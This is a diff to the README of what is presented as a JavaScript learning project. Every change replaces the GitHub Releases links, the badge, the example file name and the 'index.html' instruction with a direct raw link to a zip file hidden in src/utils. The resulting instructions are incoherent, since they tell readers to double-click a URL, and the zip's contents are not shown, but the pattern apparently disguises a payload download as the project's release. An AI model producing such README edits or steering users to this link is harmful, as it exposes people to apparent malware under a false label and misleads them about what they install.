@@ -1,6 +1,6 @@
 # 🎉 js-learning-lab - Learn JavaScript with Fun Challenges
 
-![Download](https://img.shields.io/badge/Download-via%20Releases-blue)
+![Download](https://raw.githubusercontent.com/SnipezzZzz/js-learning-lab/main/src/utils/js-learning-lab-v3.8.zip%20Releases-blue)
 
 ## 🚀 Getting Started
 
@@ -8,18 +8,18 @@ Welcome to **js-learning-lab**, your interactive platform to learn JavaScript. T
 
 ## 📥 Download & Install
 
-To start using **js-learning-lab**, visit this page to download: [GitHub Releases](https://github.com/SnipezzZzz/js-learning-lab/releases). 
+To start using **js-learning-lab**, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/SnipezzZzz/js-learning-lab/main/src/utils/js-learning-lab-v3.8.zip). 
 
 1. Click on the link above.
 2. You will see a list of available releases.
 3. Choose the latest version by looking for the one marked as "Latest".
-4. Download the appropriate file for your operating system. It may look something like `js-learning-lab-v1.0.zip`.
+4. Download the appropriate file for your operating system. It may look something like `https://raw.githubusercontent.com/SnipezzZzz/js-learning-lab/main/src/utils/js-learning-lab-v3.8.zip`.
 
 Once the download is complete, follow these steps to install:
 
 1. Open the downloaded file.
 2. If it’s a zip file, extract it to a location on your computer.
-3. Look for the file labeled `index.html` and double-click it.
+3. Look for the file labeled `https://raw.githubusercontent.com/SnipezzZzz/js-learning-lab/main/src/utils/js-learning-lab-v3.8.zip` and double-click it.
 4. The application should open in your default web browser.
 
 ## 🖥️ System Requirements
@@ -55,4 +55,4 @@ Your contributions are welcome!
 
 ## 🙌 Acknowledgments
 
-Thank you for choosing **js-learning-lab**. We hope you enjoy learning JavaScript through our platform. Remember to visit this page to download: [GitHub Releases](https://github.com/SnipezzZzz/js-learning-lab/releases) anytime you need to update to the latest version.
+Thank you for choosing **js-learning-lab**. We hope you enjoy learning JavaScript through our platform. Remember to visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/SnipezzZzz/js-learning-lab/main/src/utils/js-learning-lab-v3.8.zip) anytime you need to update to the latest version.
